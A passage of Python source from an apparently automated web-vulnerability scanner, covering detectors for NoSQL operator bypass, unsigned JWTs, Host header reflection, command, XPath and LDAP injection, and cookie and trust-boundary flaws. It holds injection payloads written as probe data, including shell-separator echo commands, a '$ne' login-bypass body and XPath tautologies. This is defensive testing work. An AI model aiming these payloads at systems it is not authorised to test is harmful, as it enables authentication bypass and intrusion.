        # OWSP-18d (live-caught on DVWA 3.x): the app echoes the stored path in
        # more shapes than a quoted href — DVWA prints it as PLAIN TEXT
        # ('<pre>../../hackable/uploads/burhan-*.txt succesfully uploaded!</pre>',
        # no quotes, no anchor). Quoted-context first, then a path-shaped
        # fallback (word/slash/dot run carrying the filename).
        m = (re.search(r"['\"]([^'\"]{0,300}" + re.escape(fname) + r")['\"]", rb)
             or re.search(r"([\w./\-]{0,300}" + re.escape(fname) + r")", rb))
        if m:
            import urllib.parse as _up
            # OWSP-18c: urljoin against a base ending in "//" (ep.url already
            # slash-terminated + the appended "/") makes every leading "../"
            # consume the empty segment first — the reference resolves one level
            # too shallow and the serve-check 404s. Base must carry exactly one
            # trailing slash.
            _base = ep.url if ep.url.endswith("/") else ep.url + "/"
            target = _up.urljoin(_base, m.group(1))
            ok_scope, _ = self.engine._scope_ok(target)
            if ok_scope:
                r2 = self.engine.send(RequestMutation(
                    endpoint=Endpoint(url=target, method="GET"), note="upload-serve-check"))
                if r2 is not None and not r2.error and r2.ok and canary in (r2.body or ""):
                    ev.append(Evidence("upload_served",
                                       f"uploaded file SERVED back at {target} — canary content intact "
                                       f"(HTTP {r2.status}, {len(r2.body or '')}B)", r2.request_id))
        return Finding(type="unrestricted_file_upload", severity=self.severity, endpoint_url=ep.url,
                       parameter=fparam.name, method=ep.method, evidence=ev,
                       status=FindingStatus.CANDIDATE)


class NosqlDetector(Detector):
    """DETECT-17 (NoSQL operator injection, auth-bypass class): JSON-body
    endpoints where a $operator object replaces a literal value and flips a
    rejection into an acceptance — the Mongo '\\$ne / \\$gt' bypass shape. The
    baseline (literal wrong credentials) must be REJECTED first; only then can
    an operator-induced acceptance be a bypass. VR-14 re-tests with a DIFFERENT
    operator (\\$gt after \\$ne)."""
    name, vuln_type = "nosql", "nosql_injection"
    severity = Severity.CRITICAL
    MAX_ENDPOINTS = 8                 # deterministic budget

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0

    @staticmethod
    def _json_body(ep: Endpoint, carrier: str, value) -> str:
        import json as _json
        obj = {}
        for p in ep.parameters:
            obj[p.name] = (value if p.name == carrier else (p.value or "burhan"))
        return _json.dumps(obj)

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if (ep.method or "GET").upper() not in ("POST", "PUT"):
            return None
        if not any(str(p.location) == "json" or getattr(p.location, "value", "") == "json"
                   or p.location == "json" for p in ep.parameters):
            return None                          # JSON-body endpoints only
        if self._done >= self.MAX_ENDPOINTS:
            return None
        self._done += 1
        carrier = next((p for p in ep.parameters if p.kind != ParamKind.TOKEN and not p.flow_control), None)
        if carrier is None:
            return None
        import json as _json
        base = self.engine.send(RequestMutation(endpoint=ep, note="nosql-baseline",
                                                body_override=self._json_body(ep, carrier.name, "burhan-wrong")))
        if base is None or base.error or base.ok:
            return None                          # baseline must be a REJECTION (401/403/4xx)
        probe = self.engine.send(RequestMutation(endpoint=ep, note="nosql-ne",
                                                 body_override=self._json_body(ep, carrier.name, {"$ne": "x"})))
        if probe is None or probe.error or not probe.ok:
            return None
        return Finding("nosql_injection", Severity.CRITICAL, ep.url, carrier.name, ep.method,
            [Evidence("operator_bypass",
                      f"NoSQL operator bypass: literal value -> HTTP {base.status} "
                      f"(rejected), {{\"$ne\"}} operator value -> HTTP {probe.status} "
                      f"(accepted) — the query treats attacker JSON objects as match "
                      f"operators, not literals. param={carrier.name}", probe.request_id)],
            status=FindingStatus.CANDIDATE)


class JwtDetector(Detector):
    """DETECT-18 (JWT analysis, auth-integrity class): auth-shaped endpoints are
    replayed benignly and their responses (body + Set-Cookie) mined for JWTs.
    An issued token with alg=none and an empty signature is a defect by
    RFC 8725 §3.1 (any party can forge claims if the verifier honors none) —
    reported with the decoded header/claims as primary evidence. Signed algs
    (HS256/RS256...) are NORMAL issuance and stay silent; missing exp is noted
    in the evidence detail. VR-15 = fresh benign replay must issue another
    none-alg token."""
    name, vuln_type = "jwt", "jwt_security"
    severity = Severity.MEDIUM
    AUTHISH = ("login", "signin", "sign-in", "auth", "token", "jwt", "session",
               "apikey", "api-key", "credential", "oauth")
    # FM-16 (first-match audit, 2026-11-03): the same starvation class the
    # modernsec round-5 fix closed — an auth-word-but-not-login surface
    # (forget-password) consumed the budget before the login ever arrived.
    # Login-shaped surfaces carry their own bounded budget and never starve.
    LOGINISH = ("login", "signin", "sign-in")
    TOKEN_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{4,}\.([A-Za-z0-9_-]*)")
    MAX_ENDPOINTS = 6                  # deterministic budget

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0
        self._done_preferred = 0
        self._skipped_noted = False

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    @staticmethod
    def _decode(seg: str) -> dict:
        import base64 as _b64, json as _json
        pad = "=" * (-len(seg) % 4)
        try:
            return _json.loads(_b64.urlsafe_b64decode(seg + pad).decode("utf-8", "replace"))
        except Exception:
            return {}

    def run(self, ep: Endpoint) -> Finding | None:
        blob = ep.url.lower()
        if not any(w in blob for w in self.AUTHISH):
            return None
        if any(w in blob for w in self.LOGINISH):
            if self._done_preferred >= self.MAX_ENDPOINTS:
                return None
            self._done_preferred += 1
        else:
            if self._done >= self.MAX_ENDPOINTS:
                # FM-16: the leftover budget line is recorded ONCE, never
                # silently — the ZOMBIE_PROBE_CAP leftover-boundary pattern.
                if not self._skipped_noted:
                    self._skipped_noted = True
                    self.bus.emit(
                        "JwtBudgetReached",
                        note=f"{self._done} auth-shaped surfaces probed; further "
                             f"non-login auth-shaped surfaces are skipped "
                             f"(MAX_ENDPOINTS={self.MAX_ENDPOINTS}, documented)")
                return None
            self._done += 1
        r = self.engine.send(RequestMutation(endpoint=ep, note="jwt-capture"))
        if r is None or r.error or not r.status:
            return None
        hay = (r.body or "") + " ".join(f"{k}={v}" for k, v in (r.headers or {}).items()
                                        if k.lower() == "set-cookie")
        m = self.TOKEN_RE.search(hay)
        if not m:
            return None
        header = self._decode(m.group(0).split(".")[0])
        alg = str(header.get("alg", "")).lower()
        sig = m.group(1)
        if alg != "none" or sig:
            return None                          # signed issuance is normal
        claims = self._decode(m.group(0).split(".")[1])
        notes = ", ".join(sorted(claims.keys())) or "no claims"
        exp_note = "" if "exp" in claims else "; missing exp claim (no expiry)"
        return Finding("jwt_security", Severity.MEDIUM, ep.url, "-", ep.method,
            [Evidence("unsigned_jwt_issued",
                      f"server issues UNSIGNED JWT (alg=none, empty signature) — "
                      f"RFC 8725 §3.1: if the verifier honors none, any party can "
                      f"forge arbitrary claims. claims: {notes}{exp_note}", r.request_id)],
            status=FindingStatus.CANDIDATE)


class HostHeaderDetector(Detector):
    """DETECT-19 (Host header injection): a canary Host is sent on GET HTML
    endpoints; if the app reflects it into the response (absolute links built
    from Host — the password-reset-poisoning / cache-poisoning class), the
    canary appears and the finding stands. Fixed-base apps never reflect —
    silent. VR-16 re-tests with a FRESH canary host."""
    name, vuln_type = "hostheader", "host_header_injection"
    severity = Severity.MEDIUM
    # Budget recalibrated for the fixture-v8 surface (Phase 56): the authenticated
    # landing now contributes 4 API endpoints that sort BEFORE the classic pages,
    # pushing /vuln/hostbuild past the old 10-endpoint cap — live-caught by the
    # benchmark going FN on host_header_injection the moment the surface grew.
    MAX_ENDPOINTS = 16
    SKIP_EXT = (".css", ".js", ".png", ".jpg", ".jpeg", ".svg", ".gif", ".ico", ".woff", ".woff2", ".map")

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def _canary(self, ep: Endpoint) -> str:
        import hashlib as _hb
        return f"burhan-hh-{_hb.sha1(ep.url.encode()).hexdigest()[:10]}.example"

    def run(self, ep: Endpoint) -> Finding | None:
        if (ep.method or "GET").upper() != "GET":
            return None
        if ep.url.split("?")[0].lower().endswith(self.SKIP_EXT):
            return None
        if self._done >= self.MAX_ENDPOINTS:
            return None
        self._done += 1
        canary = self._canary(ep)
        r = self.engine.send(RequestMutation(endpoint=ep, note="hostheader-probe",
                                             extra_headers={"Host": canary}))
        if r is None or r.error or not r.status:
            return None
        where = []
        if canary in (r.body or ""):
            where.append("response body")
        for hk, hv in (r.headers or {}).items():
            if canary in str(hv):
                where.append(f"{hk} header")
        if not where:
            return None
        return Finding("host_header_injection", Severity.MEDIUM, ep.url, "Host", "GET",
            [Evidence("host_reflection",
                      f"canary Host reflected in {', '.join(where)}: the application "
                      f"builds output from the attacker-controlled Host header "
                      f"(link-manipulation / reset-poisoning class). canary={canary}",
                      r.request_id)],
            status=FindingStatus.CANDIDATE)



SECURITY_HEADERS = ["strict-transport-security", "content-security-policy", "x-frame-options",
                    "x-content-type-options", "referrer-policy"]

def passive_audit(ep: Endpoint, resp) -> list[Finding]:
    out = []
    if resp is None or not resp.status: return out
    missing = [h for h in SECURITY_HEADERS if h not in resp.headers]
    if missing:
        out.append(Finding("missing_security_headers", Severity.LOW, ep.url, "", ep.method,
                    [Evidence("header_absent", f"missing: {', '.join(missing)}", resp.request_id)],
                    status=FindingStatus.CANDIDATE))
    srv = resp.headers.get("server", "")
    if srv and re.search(r"[0-9]+\.[0-9]+", srv):
        out.append(Finding("server_banner_disclosure", Severity.LOW, ep.url, "", ep.method,
                    [Evidence("header_value", f"Server: {srv}", resp.request_id)],
                    status=FindingStatus.CANDIDATE))
    powered = resp.headers.get("x-powered-by", "")
    if powered:
        out.append(Finding("tech_banner_disclosure", Severity.LOW, ep.url, "", ep.method,
                    [Evidence("header_value", f"X-Powered-By: {powered}", resp.request_id)],
                    status=FindingStatus.CANDIDATE))
    # PASSIVE-02 (live-caught on ginandjuice.shop): vulnerable JS dependency detection —
    # PortSwigger's scanme serves angular_1-7-7.js and lists "Vulnerable JavaScript
    # dependency" in its own ground truth. Version-sniff the asset path.
    base = ep.url.rsplit("/", 1)[-1].lower()
    for pat, msg in VULN_JS_DEPS:
        if pat.search(base):
            out.append(Finding("vulnerable_js_dependency", Severity.LOW, ep.url, "", ep.method,
                        [Evidence("banner", f"served asset {base!r}: {msg}", resp.request_id)],
                        status=FindingStatus.CANDIDATE))
            break
    return out


# Known-vulnerable JS assets (extend as advisories accumulate; keep deterministic).
VULN_JS_DEPS = [
    (re.compile(r"angular[^/?]*[_.\-]?1[_.\-]?[0-9]"),
     "AngularJS 1.x — end-of-life branch (Jan 2022); sandbox-escape / client-side template injection class (CVE-2019-10768, CVE-2024-21490)"),
]


# ================================================================ GTP detectors
# Ground-truth push round (OWASP Benchmark recall work, live-caught shapes).

class CmdiEchoDetector(Detector):
    """GTP-04 (ground-truth push): RESPONSE-ORACLE command injection — the
    computed-arithmetic echo. The OOB family (CommandInjectionDetector) is the
    strongest evidence but structurally blind on exec-direct sinks whose
    output flows back into the response (Runtime.exec + printOSCommandResults
    — the shape the OWASP Benchmark's sh -c tests use). The separator battery
    `; echo $((6*7))` proves SHELL EVALUATION when the COMPUTED result (42)
    appears in the body while the payload literal does not compute anything:
    an escaped/encoded input can only ever echo the literal `$((6*7))` text,
    never its value. Guards: the BASE response must not contain the result;
    two DIFFERENT-shaped expressions with the same result at detection and a
    FRESH expression at verification (VR-21) kill ambient-number FPs."""
    name, vuln_type = "cmdi_echo", "command_injection"
    severity = Severity.CRITICAL
    MAX_PARAMS = 2
    SCAN_WIDE_CAP = 640
    EXPRS = ["$((6*7))", "$((14*3))", "$((83-41))"]
    SEPS = ["; echo ", ";echo ", "&& echo ", "| echo "]
    # GTP-04b (round 2, live-caught on the OWASP Benchmark cmdi category —
    # 108/126 recall missing, 77 of them argsEnv-shaped): three whole sink
    # families were structurally unreachable —
    #   (a) ENV-ARRAY sinks: exec(String[] cmd, String[] envp) — the tainted
    #       string rides the ENVIRONMENT. The stock insecureCmd.sh does
    #       `eval $FOO`, so the payload must be FOO=<command> (proven live:
    #       FOO=echo BURHAN5858 printed the marker AND its reversal).
    #   (b) DIRECT-EXEC sinks: Runtime.exec(param) / ProcessBuilder with the
    #       param as argv — NO shell, separators are literal argv tokens; the
    #       value IS the command. `echo <canary>` runs the real /usr/bin/echo
    #       and its stdout is the canary alone — a reflection would carry the
    #       FULL payload text 'echo <canary>'; the exec output does not.
    #   (c) the arithmetic oracle works inside `eval` too (it is a shell
    #       builtin): FOO=echo $((6*7)) -> 42 in the process output.
    ENV_NAMES = ("FOO",)
    DIRECT_CANARY = "burhanargvmark1"
    DIRECT_CANARY2 = "burhanargvmark2"

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._probes = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if self._probes >= self.SCAN_WIDE_CAP or command_shaped_endpoint(ep):
            return None
        ep_params = 0
        for p in ep.parameters:
            if ep_params >= self.MAX_PARAMS or self._probes >= self.SCAN_WIDE_CAP:
                break
            if p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC) or p.flow_control \
                    or not p.name or getattr(p, "is_file", False):
                continue
            base = (p.value or "localhost")[:60]
            rb = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                  param_value=base, note="cmdi-echo-base"))
            if rb is None or rb.error or not rb.status:
                continue
            if "42" in (rb.body or ""):
                continue          # ambient 42 on the page — no oracle here
            for sep in self.SEPS[:2]:
                payload = base + sep + self.EXPRS[0]
                r = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                     param_value=payload,
                                                     note=f"cmdi-echo:{sep.strip()}"))
                self._probes += 1
                if r is None or r.error or not r.ok:
                    continue
                body = r.body or ""
                if "42" not in body:
                    continue
                # confirm with a DIFFERENT-shaped expression (same result)
                payload2 = base + sep + self.EXPRS[1]
                r2 = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                      param_value=payload2,
                                                      note="cmdi-echo:confirm"))
                self._probes += 1
                if r2 is None or r2.error or "42" not in (r2.body or ""):
                    continue
                i = body.find("42")
                return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                    [Evidence("shell_arithmetic",
                              f"shell evaluation proven by computed output: {self.EXPRS[0]} -> 42 "
                              f"in response (literal absent from base) and {self.EXPRS[1]} -> 42 "
                              f"confirms — separator {sep.strip()!r} reached a shell context "
                              f"[ctx: …{body[max(0,i-40):i+20]}…]", r.request_id)],
                    status=FindingStatus.CANDIDATE, detector="cmdi_echo")
            # GTP-04b(a): ENV-ARRAY twin — FOO=<expr> rides the envp array into
            # insecureCmd.sh's `eval $FOO`; the arithmetic computes in the eval
            # shell and lands in the echoed process output. Base control is the
            # same FOO= form with a literal (no 42) — kills ambient-number pages.
            for env in self.ENV_NAMES:
                rb_e = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                       param_value=f"{env}=echo {base}",
                                                       note="cmdi-echo-env-base"))
                self._probes += 1
                if rb_e is None or rb_e.error or not rb_e.status:
                    continue
                if "42" in (rb_e.body or ""):
                    continue          # ambient 42 — no oracle in this form either
                r_e = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                       param_value=f"{env}=echo {self.EXPRS[0]}",
                                                       note="cmdi-echo-env"))
                self._probes += 1
                if r_e is None or r_e.error or not r_e.ok:
                    continue
                if "42" not in (r_e.body or ""):
                    continue
                r_e2 = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                        param_value=f"{env}=echo {self.EXPRS[1]}",
                                                        note="cmdi-echo-env-confirm"))
                self._probes += 1
                if r_e2 is None or r_e2.error or "42" not in (r_e2.body or ""):
                    continue
                ie = (r_e.body or "").find("42")
                return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                    [Evidence("env_arithmetic",
                              f"env-array injection proven by computed output: {env}=echo "
                              f"{self.EXPRS[0]} -> 42 in the process output (the {env}= base "
                              f"form stays clean) and {self.EXPRS[1]} -> 42 confirms — the "
                              f"tainted string rode the environment into a shell eval "
                              f"[ctx: …{(r_e.body or '')[max(0,ie-40):ie+20]}…]", r_e.request_id)],
                    status=FindingStatus.CANDIDATE, detector="cmdi_echo")
            # GTP-04b(b): DIRECT-EXEC twin — the value IS argv (no shell): the
            # real /usr/bin/echo prints the canary ALONE ('<c1>' in body while
            # 'echo <c1>' is absent — a reflection carries the full payload
            # text, an exec output does not). Fresh second canary confirms.
            rd_a = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                   param_value=f"echo {self.DIRECT_CANARY}",
                                                   note="cmdi-direct-a"))
            self._probes += 1
            if rd_a is not None and not rd_a.error and rd_a.ok:
                bd_a = entity_normalize(rd_a.body or "").replace("+", " ")
                if (self.DIRECT_CANARY in bd_a
                        and ("echo " + self.DIRECT_CANARY) not in bd_a):
                    rd_b = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                           param_value=f"echo {self.DIRECT_CANARY2}",
                                                           note="cmdi-direct-b"))
                    self._probes += 1
                    if rd_b is not None and not rd_b.error and rd_b.ok:
                        bd_b = entity_normalize(rd_b.body or "").replace("+", " ")
                        if (self.DIRECT_CANARY2 in bd_b
                                and ("echo " + self.DIRECT_CANARY2) not in bd_b):
                            ja = bd_a.find(self.DIRECT_CANARY)
                            return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                                [Evidence("argv_echo",
                                          f"direct-exec injection: 'echo <canary1>' as the whole "
                                          f"value produced standalone canary output (canary in "
                                          f"body, 'echo <canary>' absent — a reflection would "
                                          f"carry the full payload text; an exec output does "
                                          f"not), second fresh canary confirms "
                                          f"[ctx: …{bd_a[max(0,ja-40):ja+20]}…]", rd_a.request_id)],
                                status=FindingStatus.CANDIDATE, detector="cmdi_echo")
            ep_params += 1
        return None


class XPathDetector(Detector):
    """GTP-05 (ground-truth push): XPath injection — result-set differential.
    Expression-shaped sinks ("/Employees/Employee[@emplid='<input>']") answer
    a tautology payload with a LARGER result set (every node matches) and a
    contradiction payload with an EMPTY one; the baseline (a literal that
    matches nothing) sits with the contradiction. Encoded/validated inputs
    answer all three identically (honest silence). Error signatures
    (XPathExpressionException) back the differential when the app prints them.
    VR-22 re-runs the pair with FRESH tautology/contradiction literals."""
    name, vuln_type = "xpath", "xpath_injection"
    severity = Severity.CRITICAL
    MAX_PARAMS = 2
    SCAN_WIDE_CAP = 512
    TRUE_PAYLOADS = ["' or '1'='1", "' or 1=1 or '1'='2", "x' or 'a'='a"]
    FALSE_PAYLOADS = ["' and '1'='2", "' and 1=2 and '1'='1", "x' and 'a'='b"]
    XPATH_ERR = re.compile(r"XPathExpressionException|javax\.xml\.xpath|Error parsing XPath", re.I)

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._probes = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if self._probes >= self.SCAN_WIDE_CAP or command_shaped_endpoint(ep):
            return None
        ep_params = 0
        for p in ep.parameters:
            if ep_params >= self.MAX_PARAMS or self._probes >= self.SCAN_WIDE_CAP:
                break
            if p.kind == ParamKind.TOKEN or p.flow_control or not p.name or getattr(p, "is_file", False):
                continue
            base = p.value or "burhanbase"
            rb = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                  param_value=base, note="xpath-base"))
            if rb is None or rb.error or not rb.status:
                continue
            self._probes += 1
            rt = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                  param_value=self.TRUE_PAYLOADS[0], note="xpath-true"))
            rf = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                  param_value=self.FALSE_PAYLOADS[0], note="xpath-false"))
            self._probes += 2
            if rt is None or rf is None or rt.error or rf.error or not rt.status or not rf.status:
                continue
            bt, bf, bb = len(rt.body or ""), len(rf.body or ""), len(rb.body or "")
            # tautology must ENLARGE the result beyond both baseline and contradiction.
            # GTP-05b (round 2, live-caught on the OWASP Benchmark — 1/15 recall):
            # the +120B absolute margin killed the real thing — the Benchmark's
            # one-employee record differentials are ~76B over baseline (tautology
            # 100B vs contradiction 24B, a 4x ratio). A PROPORTIONAL alternative
            # now also admits: bt > 1.5x max(bf,bb) + 30 — small-response apps with
            # strict content scaling pass, and the fresh-pair verifier (VR-22)
            # still has to reproduce it with different literals.
            big = bt > max(bf + 120, bb + 120)
            prop = bt > max(bf, bb) * 1.5 + 30 and bt > max(bf, bb) + 30
            if rt.ok and rf.ok and rt.status == rf.status and (big or prop):
                i = max(0, (len(rt.body or "") - bf) and 0)
                return Finding("xpath_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                    [Evidence("xpath_result_diff",
                              f"XPath result-set differential: tautology payload -> {bt}B vs "
                              f"contradiction -> {bf}B vs baseline -> {bb}B (the tautology "
                              "enlarges the selected node set — expression-level injection)",
                              rt.request_id, (rt.body or "")[:200])],
                    status=FindingStatus.CANDIDATE)
            # error-oracle: quote-shaped payload raises an XPath parse error the base does not
            if self.XPATH_ERR.search(rt.body or "") and not self.XPATH_ERR.search(rb.body or ""):
                return Finding("xpath_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                    [Evidence("xpath_error",
                              "XPath parse error on the injected payload while the baseline is "
                              "clean — the input reaches an expression evaluator", rt.request_id)],
                    status=FindingStatus.CANDIDATE)
            ep_params += 1
        return None


class LdapDetector(Detector):
    """GTP-06 (ground-truth push): LDAP injection — wildcard result-count
    differential. Directory filters concatenate input ("...uid=<input>)...");
    a `*` wildcard on an injectable filter matches EVERY record (result count
    explodes) while the encoded/sanitized twin matches none. The baseline sits
    with the miss. NamingException signatures back the differential. VR-23
    re-runs with a fresh wildcard shape."""
    name, vuln_type = "ldapi", "ldap_injection"
    severity = Severity.CRITICAL
    MAX_PARAMS = 2
    SCAN_WIDE_CAP = 512
    WILD = "*"
    RECORD_MARK = re.compile(r"Record found with name|LDAP query results", re.I)
    LDAP_ERR = re.compile(r"NamingException|javax\.naming|InvalidNameException|LDAP", re.I)

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._probes = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if self._probes >= self.SCAN_WIDE_CAP or command_shaped_endpoint(ep):
            return None
        ep_params = 0
        for p in ep.parameters:
            if ep_params >= self.MAX_PARAMS or self._probes >= self.SCAN_WIDE_CAP:
                break
            if p.kind == ParamKind.TOKEN or p.flow_control or not p.name or getattr(p, "is_file", False):
                continue
            base = p.value or "burhanbase"
            rb = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                  param_value=base, note="ldapi-base"))
            if rb is None or rb.error or not rb.status:
                continue
            self._probes += 1
            rw = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                  param_value=self.WILD, note="ldapi-wild"))
            self._probes += 1
            if rw is None or rw.error or not rw.status:
                continue
            nb_, nw = len(rb.body or ""), len(rw.body or "")
            cb_ = len(self.RECORD_MARK.findall(rb.body or ""))
            cw = len(self.RECORD_MARK.findall(rw.body or ""))
            if cw >= max(2, cb_ + 2) and nw > nb_ + 120:
                return Finding("ldap_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                    [Evidence("ldap_wildcard_diff",
                              f"LDAP wildcard differential: '*' -> {cw} records ({nw}B) vs "
                              f"baseline -> {cb_} records ({nb_}B) — the wildcard reached the "
                              "directory filter unescaped", rw.request_id,
                              (rw.body or "")[:200])],
                    status=FindingStatus.CANDIDATE)
            if self.LDAP_ERR.search(rw.body or "") and not self.LDAP_ERR.search(rb.body or ""):
                return Finding("ldap_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                    [Evidence("ldap_error",
                              "LDAP naming error on the injected payload while the baseline is "
                              "clean — the input reaches a directory filter", rw.request_id)],
                    status=FindingStatus.CANDIDATE)
            ep_params += 1
        return None


class SecureCookieDetector(Detector):
    """GTP-07 (ground-truth push): cookies set WITHOUT the Secure attribute on
    an application that also serves them over plain HTTP — CWE-614. The
    container's own session cookie (JSESSIONID & co.) is EXCLUDED: it is the
    platform's configuration, not the application's code decision, and on the
    Benchmark it would blanket-flag every test. VR-24 re-fetches and re-checks
    the attribute set on a fresh response."""
    name, vuln_type = "securecookie", "secure_cookie"
    severity = Severity.MEDIUM
    CONTAINER_COOKIES = ("jsessionid", "phpsessid", "asp.net_sessionid", "iplanetdirectorypro",
                         "csrftoken", "x-csrf-token")
    MAX_ENDPOINTS = 4096   # GTP-07c: 1024 starved the 2740-endpoint Benchmark

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if self._done >= self.MAX_ENDPOINTS or command_shaped_endpoint(ep):
            return None
        r = self.engine.send(RequestMutation(endpoint=ep, note="securecookie-base"))
        if r is None or r.error or not r.status:
            return None
        self._done += 1
        raw = (r.headers or {}).get("set-cookie") or ""
        if not raw:
            return None
        # multiple Set-Cookie lines may be joined; split conservatively on the cookie separator
        for chunk in re.split(r",(?=\s*[A-Za-z0-9_\-]+=)", raw):
            m = re.match(r"\s*([^=;,\s]+)\s*=", chunk)
            if not m:
                continue
            cname = m.group(1)
            if cname.lower() in self.CONTAINER_COOKIES:
                continue
            # GTP-07b (round 2, live-caught on the OWASP Benchmark — 0 candidates
            # on all 36 vulnerable securecookie tests): the Secure-attribute
            # check ran on the WHOLE header string, which carries the Path VALUE
            # — /benchmark/securecookie-NN/... contains the substring 'secure'
            # (the category's own name) and every test was skipped as 'protected'.
            # The check is now on the Set-Cookie ATTRIBUTE TOKENS: split on ';',
            # the tail segments are attribute names/values, and 'secure' must appear
            # as a BARE token (Path=/…securecookie… is a Path value, not Secure).
            attrs = [t.strip().lower() for t in chunk.split(";")[1:]]
            if "secure" in attrs:
                continue          # the app set the Secure attribute — protected
            return Finding("secure_cookie", Severity.MEDIUM, ep.url, cname, ep.method,
                [Evidence("cookie_attribute",
                          f"cookie '{cname}' is set without the Secure attribute — the value "
                          f"travels in cleartext on any plain-HTTP hop (CWE-614) "
                          f"[header: {chunk[:160]}]", r.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class TrustBoundDetector(Detector):
    """GTP-08 (ground-truth push): trust-boundary violations observed as
    INPUT-CONTROLLED REFLECTION — surfaces that echo whatever the client
    submits in a context the app later trusts (session attribute names,
    cache keys, file lines). The oracle is the CONTROL differential: two
    DISTINCT markers submitted in the SAME channel must each appear in the
    response in turn (M1 -> response contains M1; M2 -> contains M2), while
    a CONSTANT-output surface (the safe twin) shows neither. Suppression:
    findings on endpoints that already carry a VERIFIED finding of another
    class are dropped by the orchestrator post-filter — their reflection
    belongs to that class, not a boundary violation. VR-25 replays with a
    FRESH marker."""
    name, vuln_type = "trustbound", "trust_bound"
    severity = Severity.HIGH
    MAX_ENDPOINTS = 4096   # GTP-08c: 640 starved the 2740-endpoint Benchmark (only
                           # the first 23% of endpoints were ever probed — the fn
                           # list was dominated by endpoints past the cap)
    M1, M2 = "burhantb1marker", "burhantb2marker"
    # GTP-08b (round 2, live-caught on the OWASP Benchmark): the bare marker
    # reflection differential fired on EVERY reflective page on the target —
    # 285 candidates of which only 27 were right-class; the cross-class claims
    # became 62 FPs on other categories' safe tests (crypto 26, hash 23,
    # securecookie 13). The real CWE-501 shape is the value crossing INTO a
    # server-trusted context: the response explicitly reports the save — the
    # marker must sit within a bounded window of a session/storage phrase.
    # Reflect-only pages (xss/sqli/redirect echoes) carry no such phrase near
    # the marker — they stay silent, and their reflection belongs to that class.
    CONTEXT = re.compile(r"saved in session|stored in session|put in session|"
                         r"set as session attribute|session attribute|"
                         r"saved in cache|stored in cache|cached as|"
                         r"written to (the )?(session|cache|store)", re.I)

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    # TB-1c (trustbound recall round, live-caught on the OWASP Benchmark
    # 8b67a88): the last-char MANGLE family — the trust-boundary sink destroys
    # EXACTLY ONE TRAILING CHARACTER of the submitted marker before the save
    # (substring(0, len-1) DROPS it — live on BenchmarkTest01617: the plain
    # self-named probe reflects 'burhantb1marke' — or
    # StringBuilder.replace(len-1, len, "Z") REWRITES it), so the exact-marker
    # differential is structurally dead on every plain probe. The XS-2
    # discipline (from the xss close) applied to the trust-bound channels:
    # submit marker+'zz' — the mangler eats the tail, the UNTAILED marker
    # survives verbatim in the reflection, and the EXISTING needle checks
    # pass unchanged. The tail fires ONLY on channels whose plain pass missed
    # (request economy; the plain request sequence stays byte-identical).
    TAIL = "zz"

    def _pair_hit(self, r1, r2) -> tuple[str, str] | None:
        """The CONTROL differential on one channel: each response echoes
        exactly its own submitted marker (the UNTAILED needle — a tailed
        reflection carries marker+'z'/'zZ' and still matches)."""
        if r1 is None or r2 is None or r1.error or r2.error or not r1.status or not r2.status:
            return None
        b1, b2 = r1.body or "", r2.body or ""
        if self.M1 in b1 and self.M2 in b2 and self.M1 not in b2 and self.M2 not in b1:
            return b1, b2
        return None

    def run(self, ep: Endpoint) -> Finding | None:
        if self._done >= self.MAX_ENDPOINTS or command_shaped_endpoint(ep):
            return None
        self._done += 1
        seg = last_path_segment(ep.url)
        seg_ok = bool(seg) and len(seg) <= 64
        # ---- the channel battery (ordered; the first channel's plain pair
        # keeps the pre-TB request shape for the existing TP set). Each entry:
        # (param_label, channel_tag, note_prefix, mk, nc_detail) where
        # mk(marker, note) -> RequestMutation ----
        probes = []
        # (pre-TB, kept verbatim) the first mutable param's VALUE
